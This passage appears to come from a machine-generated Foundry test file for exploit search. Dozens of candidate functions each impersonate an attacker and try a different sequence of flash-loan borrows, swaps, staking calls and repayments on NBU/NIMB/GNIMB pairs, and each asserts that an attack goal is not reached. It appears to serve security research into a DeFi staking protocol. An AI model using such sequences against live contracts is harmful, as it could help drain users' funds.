        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
